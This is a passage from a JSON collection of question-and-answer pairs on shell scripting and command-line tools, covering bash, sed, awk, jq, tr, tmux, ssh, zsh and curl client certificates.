descent.\nPossible equivalents: (substitute any variable name here for var)\nif [[ ${var+\"is_set\"} == is_set ]]; then ...\nOr, probably more portable:\ncase ${var+\"IS_SET\"} in IS_SET) ...;; esac",
    "How to execute script in the current shell on Linux?": "There are two ways of executing a script in the shell. Depending upon your needs, you will have to do one of the following (don't do both!).\nLaunch the script as a program, where it has its own process.\nSource the script as a bunch of text, where the text is processed by the current shell.\nTo launch the script as a program:\nAdd the line #!/bin/bash as the first line of the script\nThis will be read by the loader, which has special logic that interperts the first two characters #! as \"launch the program coming next, and pass the contents into it\". Note this only properly works for programs written to receive the contents\nTo source the script into the current shell:\ntype the command . script.sh or source script.sh\nNote: . in bash is equivalent to source in bash.\nThis acts as if you typed in the contents of \"script.sh\". For example, if you set a variable in \"script.sh\" then that variable will be set in the current shell. You will need to undefine the variable to clear it from the current shell.\nThis differs heavily from the #!/bin/bash example, because setting a variable in the new bash subprocess won't impact the shell you launched the subprocess from.",
    "Bad : modifier in $ (.)": "Bad : modifier in $ (.).\nThis is not a Bash error, nor is it from Ksh: it's from C-shell or one of its clones such as Tcsh.\nYou want:\nsetenv PATH ${PATH}:.\nBut you should not put . in your ${PATH}, it's a well-known security risk.",
    "How to retrieve single value with grep from Json?": "You probably wanted -Po, which works with your regex:\n$ grep -oP '(?<=\"VpcId\": \")[^\"]*' infile\nvpc-123\nIf GNU grep with its -P option isn't available, we can't use look-arounds and have to resort to for example using grep twice:\n$ grep -o '\"VpcId\": \"[^\"]*' infile | grep -o '[^\"]*$'\nvpc-123\nThe first one extracts up to and excluding the closing quotes, the second one searches from the end of the line for non-quotes.\nBut, as mentioned, you'd be better off properly parsing your JSON. Apart from jq mentioned in another answer, I know of\nJshon\nJSON.sh\nA jq solution would be as simple as this:\n$ jq '.Vpc.VpcId' infile \n\"vpc-123\"\nOr, to get raw output instead of JSON:\n$ jq -r '.Vpc.VpcId' infile \nvpc-123",
    "insert a line in csv file": "In place, using sed:\nsed -i 1i\"id1,id2,id3,id4\" file.csv\nedit:\nAs @Ed Morton points out, using sed with the -i switch sed edits the file in place, and can therefore be dangerous when editing large files. If you supply a prefix after the -i option then sed creates a backup. So something like this would be safer:\nsed -i.bak 1i\"id1,id2,id3,id4\" file.csv\nThe original file will then be located in file.csv.bak",
    "how to cut columns of csv": "If you know that the column delimiter does not occur inside the fields, you can use cut.\n$ cat in.csv\nfoo,bar,baz\nqux,quux,quuux\n$ cut -d, -f2,3 < in.csv \nbar,baz\nquux,quuux\nYou can use the shell buildin 'for' to loop over all input files.",
    "Runtime's exec() method is not redirecting the output": "You need to use ProcessBuilder to redirect.\nProcessBuilder builder = new ProcessBuilder(\"sh\", \"somescript.sh\");\nbuilder.redirectOutput(new File(\"out.txt\"));\nbuilder.redirectError(new File(\"out.txt\"));\nProcess p = builder.start(); // may throw IOException",
    "Environment variables in symbolic links": "Symbolic links are handled by the kernel, and the kernel does not care about environment variables. So, no.",
    "UNIX sort ignores whitespaces": "Solved by:\nexport LC_ALL=C\nFrom the sort() documentation:\nWARNING: The locale specified by the environment affects sort order. Set LC_ALL=C to get the traditional sort order that uses native byte values.\n(works for ASCII at least, no idea for UTF8)",
    "Globbing/pathname expansion with colon as separator": "Actually, I thought of a better solution: use a shell function.\nfunction join() {\n    local IFS=$1\n    shift\n    echo \"$*\"\n}\n\nmystring=$(join ':' /var/lib/gems/*/bin)",
    "How to run a command in background using ssh and detach the session": "There are some situations when you want to execute/start some scripts on a remote machine/server (which will terminate automatically) and disconnect from the server.\neg: A script running on a box which when executed\ntakes a model and copies it to a remote server\ncreates a script for running a simulation with the model and push it to server\nstarts the script on the server and disconnect\nThe duty of the script thus started is to run the simulation in the server and once completed (will take days to complete) copy the results back to client.\nI would use the following command:\nssh remoteserver 'nohup /path/to/script `</dev/null` >nohup.out 2>&1 &'\n@CKeven, you may put all those commands on one script, push it to the remote server and initiate it as follows:\necho '#!/bin/bash  \nrm -rf statuslist  \nmkdir statuslist  \nchmod u+x ~/monitor/concat.sh  \nchmod u+x ~/monitor/script.sh  \nnohup ./monitor/concat.sh &  \n' > script.sh\n\nchmod u+x script.sh\n\nrsync -azvp script.sh remotehost:/tmp\n\nssh remotehost '/tmp/script.sh `</dev/null` >nohup.out 2>&1 &'\nHope this works ;-)\nEdit: You can also use ssh user@host 'screen -S SessionName -d -m \"/path/to/executable\"'\nWhich creates a detached screen session and runs target command within it",
    "Make windows batch file not close upon program exit": "I believe you are looking for the command \"pause\". It should ask you to press any key.\nYou can even appear to change the prompt. Instead of just using the pause statement, you can:\necho \"Your message here\"\npause > nul\nThis gets rid of the original pause message and inserts yours.\nJacob",
    "set -e and short tests": "The Single UNIX Specification describes the effect of set -e as:\nWhen this option is on, if a simple command fails for any of the reasons listed in Consequences of Shell Errors or returns an exit status value >0, and is not part of the compound list following a while, until, or if keyword, and is not a part of an AND or OR list, and is not a pipeline preceded by the ! reserved word, then the shell shall immediately exit.\nAs you see, a failing command in an AND list will not make the shell exit.\nUsing set -e\nStarting shell scripts with set -e is considered a best practice, since it is usually safer to abort the script if some error occurs. If a command may fail harmlessly, I usually append || true to it.\nHere is a simple example:\n#!/bin/sh\nset -e\n\n# [...]\n# remove old backup files; do not fail if none exist\nrm *~ *.bak || true",
    "How to redirect console output to file and STILL get it in the console?": "Use tee.\nant 2>&1|tee build.log\ntee.exe is also available for Windows from http://unxutils.sourceforge.net/",
    "new line separator for each grep result sh script [closed]": "grep \"pattern\" /path/to/file | awk '{print $0,\"\\n\"}'",
    "Find substring in shell script variable": "What shell? Using bash:\nif [[ \"$VAR\" =~ \"UAT\" ]]; then\n    echo \"matched\"\nelse\n    echo \"didn't match\"\nfi",
    "Semicolon on command line in linux": "; is treated an end of command character. So 123;456;5464 to bash is in fact 3 commands. To pass such meta-characters escape it with escape character \\.\n./command 123\\;456\\;5464\nOr Just quote it with single quote (double quote evaluates the inner string) (Thanks Triplee, I forgot to mention this)\n./command '123;456;5464'",
    "List contents of multiple jar files": "You need to pass -n 1 to xargs to force it to run a separate jar command for each filename that it gets from find:\nfind -name \"*.jar\" | xargs -n 1 jar tf\nOtherwise xargs's command line looks like jar tf file1.jar file2.jar..., which has a different meaning to what is intended.\nA useful debugging technique is to stick echo before the command to be run by xargs:\nfind -name \"*.jar\" | xargs echo jar tf\nThis would print out the full jar command instead of executing it, so that you can see what's wrong with it.",
    "No man page for the cd command": "cd is not a command, it's built into your shell. This is necessary because your current working directory is controlled by the PWD environment variable named after the pwd or \"print working directory\" command.\nThe environment variables of a parent process cannot be changed by a child process. So if your shell ran /bin/cd which changed PWD it would only affect /bin/cd and anything it ran. It would not change the shell's PWD.\nSome systems, like OS X and CentOS, map the cd man page to builtin which lists all the shell built ins and lets you know you should look at your shell's man page.\nYou can check what shell you have with echo $SHELL, it's probably bash.",
    "How to list all zsh autocompletions?": "The list of known completions is stored in the associative array _comps. The command names and other completion contexts are used as keys for _comps, while the corresponding completion functions are stored as values.\nYou can get a full list of commands with associated completions with the following command:\nfor command completion in ${(kv)_comps:#-*(-|-,*)}\ndo\n    printf \"%-32s %s\\n\" $command $completion\ndone | sort\nExplanation:\nfor command completion in LIST; COMMAND takes iterates over LIST while taking two elements, command and completion, on every iteration and running COMMAND for them. This is also a short form of the for-loop that does not require do and done.\n${(kv)ASSOC_ARRAY} expands the associative array ASSOC_ARRAY to a space separated list of key-value pairs. So it is an alternating list of \"key1 value1 key2 value2 key3 value3 \u2026\", which is taken up by the two arguments of the for-loop. $ASSOC_ARRAY would only expand to a list of values.\n${ASSOC_ARRAY:#PATTERN} filters out all elements of ASSOC_ARRAY from its expansion, where the key matches PATTERN.\nThe pattern -*(-|-,*) matches the names of all special contexts, like -math-, -parameter- or -value-,NAME,COMMAND. It would also filter any command name that either matches -*- or -*-,*, should such a command have a completion on your system. (You could just leave out the pattern filter to be sure)\nprintf \"%-32s %s\\n\" $command $completion does a formatted output so that you get a nice table. $command is printed in place of %-32s, padded to 32 characters with left-alignment (-). $completion is printed in place of %s.\n| sort: associative arrays are unordered, so output of the loop needs to be run through sort in order to get a ordered list.",
    "How to undo \"set -x\" in unix shell?": "You can use set +x to switch it back. The output of help set describes this:\n$ help set\nset: set [--abefhkmnptuvxBCHP] [-o option] [arg ...]\n    ...\n    -v  Print shell input lines as they are read.\n    -x  Print commands and their arguments as they are executed.\n    ...\n\nUsing + rather than - causes these flags to be turned off.  The\nflags can also be used upon invocation of the shell.  The current\nset of flags may be found in $-.  The remaining n ARGs are positional\nparameters and are assigned, in order, to $1, $2, .. $n.  If no\nARGs are given, all shell variables are printed.\nNote the \u201cUsing + rather than - causes these flags to be turned off\u201d part.",
    "Starting a new tmux session and detaching it, all inside a shell script": "Start a shell, and send vagrant up to it, so you can see the errors.\ntmux new-session -d -s rtb123\ntmux send-keys 'vagrant up' C-m\ntmux detach -s rtb123\nThe C-m means hit return.",
    "setting the output field separator in awk": "You need to convince awk that something has changed to get it to reformat $0 using your OFS. The following works though there may be a more idiomatic way to do it.\nBEGIN {FS = \"\\t\";OFS = \",\" ; print \"about to open the file\"}\n{$1=$1}1\nEND {print \"about to close stream\" }",
    "Explanation of convertor of cidr to netmask in linux shell netmask2cdir and cdir2netmask [closed]": "mask2cdr()\nTo get the CIDR prefix from a dot-decimal netmask like this one:\n255.255.192.0\nyou first have to convert the four octets to binary and then count the most significant bits (i.e. the number of leading ones):\n11111111.11111111.11000000.00000000  # 18 ones = /18 in CIDR\nThis function does that rather creatively. First, we strip off all of the leading 255 octets (i.e. the octets that are all ones in binary) and store the results in variable x:\nlocal x=${1##*255.}\nThis step uses parameter expansion, which the entire script relies on pretty heavily. If we continue with our example netmask of 255.255.192.0, we now have the following values:\n$1: 255.255.192.0\n$x: 192.0\nNext we set three variables: $1, $2, and $3. These are called positional parameters; they are much like ordinary named variables but are typically set when you pass arguments to a script or function. We can set the values directly using set --, for example:\nset -- foo bar  # $1 = foo, $2 = bar\nI prefer using named variables over positional parameters since it makes scripts easier to read and debug, but the end result is the same. We set $1 to:\n0^^^128^192^224^240^248^252^254^\nThis is really just a table to convert certain decimal values to binary and count the number of 1 bits. We'll come back to this later.\nWe set $2 to\n$(( (${#1} - ${#x})*2 ))\nThis is called Arithmetic Expansion. It looks complex, but it is really just counting the number of 1 bits we stripped off in the first command. It breaks down to this:\n(number of chars in $1 - number of chars in $x) * 2\nwhich in our case works out to\n(13 - 5) * 2 = 16\nWe stripped off two octets so we get 16. Makes sense.\nWe set $3 to:\n${x%%.*}\nwhich is the value of $x with everything after the first . stripped off. In our case, this is 192.\nWe need to convert this number to binary and count the number of 1 bits in it, so let's go back to our \"conversion table.\" We can divide the table into equal chunks of four characters each:\n0^^^  128^  192^  224^  240^  248^  252^  254^\nIn binary, the above numbers are:\n00000000 10000000 11000000 11100000 11110000 11111000 11111100 11111110\n# 0 ones 1 one    2 ones   3 ones   ...\nIf we count from the left, each four-character block in the table corresponds to an additional 1 bit in binary. We're trying to convert 192, so let's first lop off the rightmost part of the table, from 192 on, and store it in x:\nx=${1%%$3*}\nThe value of $x is now\n0^^^128^\nwhich contains two four-character blocks, or two 1 bits in binary.\nNow we just need to add up the 1 bits from our leading 255 octets (16 total, stored in variable $2) and the 1 bits from the previous step (2 total):\necho $(( $2 + (${#x}/4) ))\nwhere\n${#x}/4\nis the number of characters in $x divided by four, i.e. the number of four-character blocks in $x.\nOutput:\n18\ncdr2mask()\nLet's keep running with our previous example, which had a CIDR prefix of 18.\nWe use set -- to set positional parameters $1 through $9:\n$1: $(( 5 - ($1 / 8) ))  # 5 - (18 / 8) = 3 [integer math]\n$2: 255\n$3: 255\n$4: 255\n$5: 255\n$6: $(( (255 << (8 - ($1 % 8))) & 255 ))  # (255 << (8 - (18 % 8))) & 255 = 192\n$7: 0\n$8: 0\n$9: 0\nLet's examine the formulas used to set $1 and $6 a little closer. $1 is set to:\n$(( 5 - ($1 / 8) ))\nThe maximum and minimum possible values for a CIDR prefix are 32 for netmask\n11111111.11111111.11111111.11111111\nand 0 for netmask\n00000000.00000000.00000000.00000000\nThe above formula uses integer division, so the possible results range from 1 to 5:\n5 - (32 / 8) = 1\n5 - ( 0 / 8) = 5\n$6 is set to:\n$(( (255 << (8 - ($1 % 8))) & 255 ))\nLet's break this down for our example CIDR prefix of 18. First we take the modulus and do some subtraction:\n8 - (18 % 8) = 6\nNext we bitwise shift 255 by this value:\n255 << 6\nThis is the same as pushing six 0 bits onto the end of 255 in binary:\n11111111000000\nFinally, we bitwise AND this value with 255:\n11111111000000 &\n00000011111111  # 255\nwhich gives\n00000011000000\nor simply\n11000000\nLook familiar? This is the third octet in our netmask in binary:\n11111111.11111111.11000000.00000000\n                  ^------^\nIn decimal, the value is 192.\nNext we shift the positional parameters based on the value of $1:\n[ $1 -gt 1 ] && shift $1 || shift\nIn our case, the value of $1 is 3, so we shift the positional parameters 3 to the left. The previous value of $4 becomes the new value of $1, the previous value of $5 becomes the value of $2, and so on:\n$1: 255\n$2: 255\n$3: 192\n$4: 0\n$5: 0\n$6: 0\nThese values should look familiar: they are the decimal octets from our netmask (with a couple of extra zeros tacked on at the end). To get the netmask, we simply print out the first four with dots in between them:\necho ${1-0}.${2-0}.${3-0}.${4-0}\nThe -0 after each parameter says to use 0 as the default value if the parameter is not set.\nOutput:\n255.255.192.0",
    "Executing a script in MSYS2/MinGW": "To run a Bash shell script in MSYS2 without showing a window, you should right-click on your Desktop or somewhere else in Windows Explorer, select \"New\", select \"Shortcut\", and then enter something like this for the shortcut target:\nC:\\msys64\\usr\\bin\\mintty.exe -w hide /bin/env MSYSTEM=MINGW64 /bin/bash -l /c/Users/rom1v/project/release.sh\nNote that there are 4 paths in here. The path to mintty and release.sh are absolute paths that you will need to adjust. The paths to env and bash are relative to your MSYS2 installation directory. Note also that the first path must be a standard Windows path, since Windows expects that when it is running a shortcut.\nExplanation\nIt might seem odd to use MinTTY for a non-interactive script, but we need to use some program that was compiled for the Windows subsystem (-mwindows option to GCC), or else Windows will automatically start a new console when we run the program. We pass the -w hide option to MinTTY to tell it not to actually show a window. Everything after that option is interpreted by MinTTY as a command to run.\nSo MinTTY will run /bin/env from the MSYS2 distribution and pass the remainder of the arguments on to it. This is a handy utility that is actually a standard part of Linux as well as MSYS2. It sets the MSYSTEM environment variable to MINGW64 (which is important later) and then it runs /bin/bash with the remainder of the command-line arguments.\nWe pass -l to Bash so that it acts as a login script, and runs certain startup scripts. In particular, the /etc/profile script from MSYS2 is essential because it looks at the MSYSTEM environment variable, sees that it is MINGW64, and then sets a bunch of other environment variables (e.g. PATH) to give you the MinGW 64-bit shell environment.\nFinally, we pass the name of your script as the main argument to bash, so it will run that script after running the initialization scripts.\nError handling\nNote that if your Bash script has an error, you won't get any notification, because the shortcut above doesn't open any console windows. I personally would find that pretty annoying. I'd probably remove the -w hide option, then make a wrapper bash script that just does something like:\nrun_my_main_script || sleep 10000\nSo if the main script is successful, exit right away, otherwise keep the window open for 10000 seconds. You don't have to even put that wrapper script in its own file, you can just put it in the shortcut as the argument to Bash's -c option (don't forget to wrap it in double quotes).",
    "How to split an array into chunks with jq?": "There is an (undocumented) builtin, _nwise, that meets the functional requirements:\n$ jq -nc '[1,2,3,4,5,6,7,8,9,10] | _nwise(3)'\n\n[1,2,3]\n[4,5,6]\n[7,8,9]\n[10]\nAlso:\n$ jq -nc '_nwise([1,2,3,4,5,6,7,8,9,10];3)' \n[1,2,3]\n[4,5,6]\n[7,8,9]\n[10]\nIncidentally, _nwise can be used for both arrays and strings.\n(I believe it's undocumented because there was some doubt about an appropriate name.)\nTCO-version\nUnfortunately, the builtin version is carelessly defined, and will not perform well for large arrays. Here is an optimized version (it should be about as efficient as a non-recursive version):\ndef nwise($n):\n def _nwise:\n   if length <= $n then . else .[0:$n] , (.[$n:]|_nwise) end;\n _nwise;\nFor an array of size 3 million, this is quite performant: 3.91s on an old Mac, 162746368 max resident size.\nNotice that this version (using tail-call optimized recursion) is actually faster than the version of nwise/2 using foreach shown elsewhere on this page.",
    "curl command - Unable to load client cert -8018": "I also experienced this issue on RHEL 6. curl was compiled with NSS, which you can see by checking the version:\n$ curl -V\ncurl 7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.14.3.0 zlib/1.2.3 libidn/1.18 libssh2/1.4.2\nProtocols: tftp ftp telnet dict ldap ldaps http file https ftps scp sftp \nFeatures: GSS-Negotiate IDN IPv6 Largefile NTLM SSL libz\nThe solution is to provide curl with a reference to the NSS database that stores the client certificate you want to use.\nCreate the certificate\nI was starting from a Java keystore, which was created with this command (the alias value will be used to reference the certificate later):\nkeytool -genkeypair -alias myclient -keyalg RSA -keystore client_keystore.jks\nNow, this JKS keystore needs to be converted to a pkcs12 format:\nkeytool -importkeystore -srckeystore client_keystore.jks \\\n    -destkeystore client_keystore.p12 -srcstoretype jks \\\n    -deststoretype pkcs12\nImport the certificate into an NSS database\nNext, create an NSS database in a directory of your choice:\nmkdir /home/user/nss\ncertutil -N -d /home/user/nss\nThis certutil command creates 3 .db files, including cert8.db. This is the \"old\" db format but should still work. View the certutil documentation if you need to create a cert9.db file instead.\nUse pk12util to import client_keystore.p12 into the NSS database\npk12util -i client_keystore.p12 -d /home/user/nss\nOptionally, view the stored certificate in the database:\ncertutil -L -d /home/user/nss -n myclient\nUse the certificate from curl\nThe certificate is now ready to be used by curl, but we need to let curl know where to find it. As specified in the curl manual, create an SSL_DIR environment variable:\nexport SSL_DIR=/home/user/nss\nFinally, the curl command:\ncurl -vk --cert myclient https://localhost:8443/my/url\nNote: the -k option is specified here because the server is using a self-signed certificate. See the curl manual for how to specify a cacert.\nRemember to add the client certificate to the server's truststore if needed.\nReference\ncertutil and pk12util Documentation\nPoint curl to Firefox's NSS database (~/.mozilla/firefox/[profile])",
    "Why does awk print the entire line instead of the first field?": "It's because Bash is interpreting $1 as referring to the first shell argument, so it replaces it with its value. Since, in your case, that parameter is unset, $1 just gets replaced with the empty string; so your AWK program is actually just {print }, which prints the whole line.\nTo prevent Bash from doing this, wrap your AWK program in single-quotes instead of double-quotes:\necho \"Hello brave new world\" | awk '{print $1}'\nor\necho 'Hello brave new world' | awk '{print $1}'",
    "How can I provide tab completions to fish shell from my own script?": "Adapted from zanchey's comment on GitHub:\nIf you have a program myprog which takes the --_completion option, you can write a single completion stub for myprog that looks like this:\ncomplete --command myprog --arguments '(myprog --_completion (commandline -cp)'\nYour program will then get invoked as myprog --_completion myprog some arguments here, and you can respond with the appropriate completions. It should return only the current token that is being completed (you could also pass this to the program with (commandline -ct), or tokenise it yourself), followed optionally by a tab and a short description. Multiple completions are separated with new lines.\nNotes:\n--_completion is a convention suggested by the python-selfcompletion library, but you can use anything you want, and this answer is not Python-specific\nThere is no way to specify the default completion as described in dbarnett/python-selfcompletion#2 (GitHub comment). You would definitely have to make a short stub for each command.\nFor Python scripts specifically, the following libraries may support fish completions at some point in the future (but they don't yet):\nargcomplete\npython-selfcompletion",
    "How to check if a symlink target matches a specific path?": "You should use double quotes as follow when you compare strings (and yes, the output of readlink $HOME/.slate.js is a string):\n[ \"$(readlink $HOME/.slate.js)\" = \"$target_path\" ]",
    "How to get all parent processes and all subprocesses with `pstree`": "# With my psmisc 22.20:\npstree -p -s PID\nMaybe if with ps -ef:\nawk -vPID=$1 '\nfunction getParent ( pid ) {\n    if (pid == \"\" || pid == \"0\") return;\n    while (\"ps -ef | grep \"pid | getline) {\n        if ($2 == pid) {\n            print $8\"(\"$2\") Called By \"$3;\n            getParent($3);\n            break;\n        }\n    }\n    close (\"ps -ef\")\n}\n\nBEGIN { getParent(PID) }\n'\nThis is ugly assuming ps output column and order. Actually one single run of ps -ef contains all info needed. This don't worth the time, I still recommend updating psmisc, it won't hurt.\nEDIT: A mimic using single run ps -ef:\nps -ef | awk -vPID=$1 '\nfunction getpp ( pid, pcmd, proc ) {\n    for ( p in pcmd ) {\n        if (p == pid) {\n            getpp(proc[p], pcmd, proc);\n            if (pid != PID) printf(\"%s(%s)\u2500\u2500\u2500\", pcmd[pid], pid);\n        }\n    }\n}\n\nNR > 1 {\n    # pid=>cmd\n    pcmd[$2] = $8;\n    # pid=>Parent\n    pproc[$2] = $3;\n}\n\nEND {\n    getpp(PID, pcmd, pproc);\n    printf \"\\n\";\n    system(\"pstree -p \"PID);\n}'",
    "how do I use pipes in a makefile shell command?": "One error is coming from sed. When you write:\nsed \"s/\\s*$//\"\nmake expands the variable $/ to an empty string, so sed is missing a delimiter. Try:\nsed \"s/\\s*$$//\"\nUsing $\" is causing the same problem in grep. Use grep -v \"^\\s*$$\" instead.",
    "How to get PowerShell to keep a command window open?": "Try doing:\nstart-process your.exe -NoNewWindow\nAdd a -Wait too if needed.",
    "Have you ever got this message when moving a file? mv: will not overwrite just-created": "Here's how to reproduce it:\n> mkdir a b c\n> touch a/file\n> touch b/file\n> mv a/file b/file c/\nmv: will not overwrite just-created `c/file' with `b/file'\nThere may be other ways to reproduce this, but it's reasonable to assume above has happened.\nThat is, your script moved multiple files with the same name into the same target in one single mv command. After executing the above you will notice that a/file was successfully moved (and b/file left as is), so next time you execute it, the problem will most likely go away.",
    "Capturing SIGINT using KeyboardInterrupt exception works in terminal, not in script": "There is one case in which the default sigint handler is not installed at startup, and that is when the signal mask contains SIG_IGN for SIGINT at program startup. The code responsible for this can be found here.\nThe signal mask for ignored signals is inherited from the parent process, while handled signals are reset to SIG_DFL. So in case SIGINT was ignored the condition if (Handlers[SIGINT].func == DefaultHandler) in the source won't trigger and the default handler is not installed, python doesn't override the settings made by the parent process in this case.\nSo let's try to show the used signal handler in different situations:\n# invocation from interactive shell\n$ python -c \"import signal; print(signal.getsignal(signal.SIGINT))\"\n<built-in function default_int_handler>\n\n# background job in interactive shell\n$ python -c \"import signal; print(signal.getsignal(signal.SIGINT))\" &\n<built-in function default_int_handler>\n\n# invocation in non interactive shell\n$ sh -c 'python -c \"import signal; print(signal.getsignal(signal.SIGINT))\"'\n<built-in function default_int_handler>\n\n# background job in non-interactive shell\n$ sh -c 'python -c \"import signal; print(signal.getsignal(signal.SIGINT))\" &'\n1\nSo in the last example, SIGINT is set to 1 (SIG_IGN). This is the same as when you start a background job in a shell script, as those are non interactive by default (unless you use the -i option in the shebang).\nSo this is caused by the shell ignoring the signal when launching a background job in a non interactive shell session, not by python directly. At least bash and dash behave this way, I've not tried other shells.\nThere are two options to deal with this situation:\nmanually install the default signal handler:\nimport signal\nsignal.signal(signal.SIGINT, signal.default_int_handler)\nadd the -i option to the shebang of the shell script, e.g:\n#!/bin/sh -i\nedit: this behaviour is documented in the bash manual:\nSIGNALS\n...\nWhen job control is not in effect, asynchronous commands ignore SIGINT and SIGQUIT in addition to these inherited handlers.\nwhich applies to non-interactive shells as they have job control disabled by default, and is actually specified in POSIX: Shell Command Language",
    "start-stop-daemon quoted arguments misinterpreted": "Try\nDAEMON_OPTS=\"-la '/folder with space/'\"\nstart-stop-daemon --start ... -- $DAEMON_OPTS\nWhat happens is that the outer quotes of DAEMON_OPTS are stripped but the inner (single quotes) remain. So the next line will read:\nstart-stop-daemon --start ... -- -la '/folder with space/'\nwhich is what you want.\nIt is also possible to achieve the same effect with escaping but you need a lot of escapes for this: First, to protect the quotes during the assignment, then later when the start line is parsed and variables are expanded and maybe even once more or less. :) bash -x is your friend for things like that.\n[EDIT] The code above does work with Bourne and Korn shell on anything but Linux. On Linux, with ksh or bash, the shell will add additional quotes which mess up the whole thing:\nFOLDER=\"/folder with space/\"\nDAEMON_OPTS=\"-la $FOLDER\"\nstart-stop-daemon --start ... -- $DAEMON_OPTS\nIf you run it with -x, you'll see:\nFOLDER='/folder with space/'\nDAEMON_OPTS='-la ~/folder with space/'\nls -la '~/folder' with space/\nSo only the first word gets protection (probably because it contains a special character). If I add single quotes around $FOLDER, I get:\nFOLDER='/folder with space/'\nDAEMON_OPTS='-la '\\''~/folder with space/'\\'''\nls -la ''\\''~/folder' with 'space/'\\'''\nWell done. Workaround: Split the options into two variables: One with the options and the other with the path:\nstart-stop-daemon --start ... -- $DAEMON_OPTS \"$DAEMON_PATH\"\n[EDIT2] This works, too:\nFOLDER=\"$HOME/folder with space/\"\nopt[0]=-la\nopt[1]=$FOLDER\nls \"${opt[@]}\"\ni.e. put the words into an array.",
    "What's the difference between Arguments and Options?": "",
    "How can I implement my own basic unix shell in C?": "All the unix shells are open-source - so a good place to start may be to read the code.\nIf you're looking for a good starter article on the subject try Writing Your Own Shell from the Linux Gazette.\nAnother good starting point is to take a look at the source code of mini-shell just because its one of the smallest to get your head round.",
    "How to implement 'set -o pipefail' in a POSIX way - almost done, expert help needed": "My two cents:\n#!/bin/sh\n\n# Saving the pid of the main shell is required,\n# as each element of the pipe is a subshell.\nself=$$\n\nlots_and_fail() {\n    seq 100\n    return 1\n}\n\n{ lots_and_fail || kill $self; } | sed s/7/3/\nThis thing seems to do the job. Thoughts?",
    "Shell script shebang for unknown path": "/usr/bin/env is specifically thought of for cross-platform solutions.\nenv executes utility after modifying the environment as specified on\nthe command line.  The option name=value specifies an environmental\nvariable, name, with a value of value.  The option `-i' causes env\nto completely ignore the environment it inherits.\n\nIf no utility is specified, env prints out the names and values of\nthe variables in the environment, with one name=value pair per line.\nso something in lines of:\n#!/usr/bin/env node\nWill be cross-platform and \"the right way to go\".",
    "How can I make the watch command interpret vt100 sequences?": "From man watch of watch 0.3.0 on Ubuntu 11.10:\nBy default watch will normally not pass escape characters, however if you use the --c or --color option, then watch will interpret ANSI color sequences for the foreground.\nIt doesn't seem to work with your literal string on my terminal, but these work:\nwatch --color 'tput setaf 1; echo foo'\nwatch --color ls -l --color",
    "The Not Equal Tilde in bash": "There is no opposing operator in bash up to version 4.3 (current at the time of this post).\n[[ ! str1 =~ str2 ]] is the way to go.\nFor such questions, you should use man instead of your favourite search engine. The man page of the tool involved -- bash, in this case -- is authoritative, the 'web is hearsay (unless, of course, it led you to the man page ;-) ).",
    "RVM + Zsh \"RVM is not a function, selecting rubies with 'rvm use ...' will not work\"": "For me, I just had to add\nsource $HOME/.rvm/scripts/rvm\nto my ~/.zshrc and it started working, after having the same error message as in this SO question.",
    "Binding option left and right arrows to move by words in zsh command line": "You can configure iTerm2 to do this like so:\nGo to iTerm2 > Preferences > Profiles > Keys\nIf there is already an \u2325 \u2190 or \u2325 \u2192 setting, delete it by selecting it and hitting -.\nAdd a new shortcut by hitting the + button.\nType \u2325+\u2190 in the Keyboard shortcut box.\nSelect Send Escape Sequence in the Action box.\nEnter b for Characters to send.\nClick Ok.\nRepeat the above procedure for \u2325 \u2192, this time entering f for the Characters to send.\nTaken from this great tutorial which describes the whole process in detail and with pictures:\nUse \u2325 \u2190 and \u2325 \u2192 to jump forwards / backwards words in iTerm 2, on OS X | Coderwall",
    "\"set: illegal option -\" on one host but not the other": "This almost certainly means your file has DOS newlines -- thus, hidden CR characters at the end.\nThus, set -e becomes set -e$'\\r' (using bash-specific syntax to represent the CR character), which isn't a valid option.\nThis also explains the : not found, as a CR will reset the cursor to the beginning of the line, truncating an error message of the form sh: commandname: not found by making the commandname instead an operation that moves the cursor to the beginning of the line.",
    "Shell out from ruby while setting an environment variable": "system({\"MYVAR\" => \"42\"}, \"echo $MYVAR\")\nsystem accepts any arguments that Process.spawn accepts.",
    "How to replace newlines with tab characters?": "tr is better here, I think:\ntr \"\\n\" \"\\t\" < newlines \nAs Nifle suggested in a comment, newlines here is the name of the file holding the original text.\nBecause sed is so line-oriented, it's more complicated to use in a case like this.",
    "dyld: Library not loaded: Referenced from: /usr/local/bin/awk": "update it with:\n\"brew upgrade gawk\"\nThis should be fixed.",
    "What does the mkdir -p mean in a script file?": "-p is short for --parents - it creates the entire directory tree up to the given directory.\nE.g., suppose there are no directories in your current directory. If you execute:\nmkdir a/b/c\nIt will fail, since you do not have an a subdirectory.\nOn the other hand\nmkdir -p a/b/c\nWill create the entire structure - a/b/c",
    "How to replace multiple spaces with a single space using Bash? [duplicate]": "Using tr:\n$ echo \"too         many       spaces.\" | tr -s ' '\ntoo many spaces\nman tr:\n-s, --squeeze-repeats\n       replace each sequence of a repeated character that is listed  in\n       the last specified SET, with a single occurrence of that charac\u2010\n       ter\nEdit: Oh, by the way:\n$ s=\"foo      bar\"\n$ echo $s\nfoo bar\n$ echo \"$s\"\nfoo      bar\nEdit 2: On the performance:\n$ shopt -s extglob\n$ s=$(for i in {1..100} ; do echo -n \"word   \" ; done) # 100 times: word   word   word...\n$ time echo \"${s//+([[:blank:]])/ }\" > /dev/null\n\nreal    0m7.296s\nuser    0m7.292s\nsys     0m0.000s\n$ time echo \"$s\" | tr -s ' ' >/dev/null\n\nreal    0m0.002s\nuser    0m0.000s\nsys     0m0.000s\nOver 7 seconds?! How is that even possible. Well, this mini laptop is from 2014 but still. Then again:\n$ time echo \"${s//+( )/ }\" > /dev/null\n\nreal    0m1.198s\nuser    0m1.192s\nsys     0m0.000s",
    "Echo command, and then run it? (Like make)": "You could make your own function to echo commands before calling eval.\nBash also has a debugging feature. Once you set -x bash will display each command before executing it.\ncnicutar@shell:~/dir$ set -x\ncnicutar@shell:~/dir$ ls\n+ ls --color=auto\na  b  c  d  e  f",
    "Scrapy Shell - How to change USER_AGENT": "scrapy shell -s USER_AGENT='custom user agent' 'http://www.example.com'",
    "sed command to replace multiple spaces into single spaces": "Using tr, the -s option will squeeze consecutive chars to a single one:\ntr -s '[:space:]' < test.txt\n iiHi Hello Hi\nthis is loga\nTo downcase as well: tr -s '[:space:]' < test.txt | tr '[:upper:]' '[:lower:]'",
